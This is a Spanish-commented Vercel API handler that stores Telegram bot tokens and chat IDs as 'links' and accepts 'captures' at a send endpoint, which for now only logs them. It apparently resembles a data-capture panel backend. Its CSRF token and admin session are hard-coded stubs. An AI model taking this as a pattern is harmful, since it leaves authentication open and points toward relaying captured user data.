export default async function handler(req, res) {
  // Obtener la ruta de forma compatible con todas las versiones de Vercel
  let p = "";
  if (Array.isArray(req.query.path)) {
    p = req.query.path.join("/");
  } else if (typeof req.query.path === "string") {
    p = req.query.path;
  } else {
    // Fallback: extraer de la URL
    const url = new URL(req.url, "http://localhost");
    p = url.pathname.replace(/^\/api\/?/, "");
  }

  console.log("Ruta recibida:", p, "Método:", req.method);

  // CSRF
  if (p === "csrf") {
    return res.status(200).json({ csrfToken: "tok-" + Math.random().toString(36).slice(2) });
  }

  // Auth session
  if (p === "auth/session") {
    return res.status(200).json({ uid: "user-1", name: "Admin" });
  }

  // Auth logout
  if (p === "auth/logout") {
    return res.status(200).json({ success: true });
  }

  // Links list
  if (p === "links/list" && req.method === "GET") {
    return res.status(200).json([]);
  }

  // Links create
  if (p === "links/create" && req.method === "POST") {
    const body = typeof req.body === "string" ? JSON.parse(req.body) : (req.body || {});
    const { botToken, chatId } = body;
    if (!botToken || !chatId) {
      return res.status(400).json({ error: "Faltan botToken o chatId" });
    }
    
    let botName = "Bot";
    try {
      const me = await fetch(`https://api.telegram.org/bot${botToken}/getMe`).then(r => r.json());
      if (me.ok) botName = me.result.username || me.result.first_name || "Bot";
    } catch (e) {}

    const link = {
      id: Math.random().toString(36).slice(2, 20),
      botName,
      botToken,
      chatId,
      status: "ACTIVE",
      createdAt: new Date().toISOString()
    };

    return res.status(200).json(link);
  }

  // Send (capturas)
  if (p === "send" && req.method === "POST") {
    const body = typeof req.body === "string" ? JSON.parse(req.body) : (req.body || {});
    const { linkId, type, data } = body;
    
    // Por ahora solo confirmamos recepción
    console.log("Captura recibida:", type, "para link:", linkId);
    
    return res.status(200).json({ success: true });
  }

  // Si no coincide nada
  return res.status(404).json({ error: "Ruta no encontrada: " + p });
}
